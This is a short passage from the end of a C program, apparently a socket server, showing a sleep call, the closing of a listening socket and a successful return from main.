                sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}